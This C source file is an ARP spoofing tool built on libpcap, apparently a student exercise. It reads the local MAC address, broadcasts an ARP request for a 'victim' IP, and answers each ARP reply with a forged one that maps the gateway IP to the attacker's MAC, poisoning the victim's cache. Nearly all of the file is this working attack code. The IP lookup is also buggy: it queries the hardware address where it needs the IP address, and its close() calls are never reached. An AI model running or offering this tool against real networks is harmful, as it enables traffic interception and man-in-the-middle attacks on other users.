/* 2020-08-11 recommit */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <libnet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>

#define size 6

static uint8_t getmymac[size];

#pragma pack(push, 1)
struct EthArpPacket{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

Mac getmacaddr(char *dev) // gilgil code review update
{
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

	if (ioctl( fd, SIOCGIFHWADDR, &ifr ) == 0){

		memcpy(&getmymac, ifr.ifr_hwaddr.sa_data, size);
	}else{
		printf("network interface error\n");
		return 0;
	}

	close(fd);

}

char* getmyipaddr(char *dev)
{
	int fd;
	struct ifreq ifr;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

	if (ioctl( fd, SIOCGIFHWADDR, &ifr ) == 0){

		return inet_ntoa(((struct sockaddr_in *)(&ifr.ifr_addr))->sin_addr);

	}else{
		printf("network interface error\n");
		return 0;
	}

	close(fd);

}

int main(int argc, char* argv[]){
	if(argc != 4){
        	printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]); 
        	return 0;
    	}

    char *dev = argv[1];
	char* sip = argv[2]; //sender ip(char *)
	char* tip = argv[3]; //target ip(char *)
   	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle;

   	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   	if(handle == nullptr){
        fprintf(stderr, "device open error %s(%s)\n",dev, errbuf);
        return 0;
    }

	EthArpPacket packet;

	getmacaddr(dev); // get my mac addr

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // victim , mac(broadcast)
	packet.eth_.smac_ = Mac(getmymac); // Mac(getmymac)
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // request or reply
	packet.arp_.smac_ = Mac(getmymac); // Mac(getmymac)
	packet.arp_.sip_ = htonl(Ip(getmyipaddr(dev))); // getmyipaddr
	packet.arp_.tmac_ = Mac("ff:ff:ff:ff:ff:ff"); // victim, mac(broadcast)
	packet.arp_.tip_ = htonl(Ip(sip)); // host victim ip
	//192.168.25.23(gram = sip) 192.168.25.1(gateway = tip)

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	
	if(res != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 0;
	}

	while(true){
		struct pcap_pkthdr* header;
		struct EthHdr *eth_hdr;
		struct ArpHdr *arp_hddr;
		const u_char *packet;

		int res = pcap_next_ex(handle, &header, &packet);
		if(res == 0){
			continue;
		}else if(res == -1 || res == -2){
			printf("pcap packet %s",pcap_geterr(handle));
			return 0;
		}

		eth_hdr = (struct EthHdr *) packet;
		arp_hddr = (struct ArpHdr *)(packet + sizeof(struct EthHdr));

		/* gilgil code review update */
		if(ntohs(eth_hdr->type_) == EthHdr::Arp && ntohs(arp_hddr->op_) == ArpHdr::Reply){
			EthArpPacket packet;
			packet.eth_.dmac_ = eth_hdr->smac_;
			packet.eth_.smac_ = Mac(getmymac); // getmacaddr -> getmymac
			packet.eth_.type_ = htons(EthHdr::Arp);
			packet.arp_.hrd_ = htons(ArpHdr::ETHER);
			packet.arp_.pro_ = htons(EthHdr::Ip4);
			packet.arp_.hln_ = Mac::SIZE;
			packet.arp_.pln_ = Ip::SIZE;
			packet.arp_.op_ = htons(ArpHdr::Reply); // request or reply
			packet.arp_.smac_ = Mac(getmymac); //Mac(getmymac);
			packet.arp_.sip_ = htonl(Ip(tip)); // target ip
			packet.arp_.tmac_ = eth_hdr->smac_;
			packet.arp_.tip_ = htonl(Ip(sip)); // sender ip
			//192.168.25.23(gram = sip) 192.168.25.1(gateway = tip)

			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	
			if(res != 0){
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return 0;
			}

		}

	}

	pcap_close(handle);

	return 0;
	
}

/* reference
mac/ip addr : https://www.cnx-software.com/2011/04/05/c-code-to-get-mac-address-and-ip-address/
*/
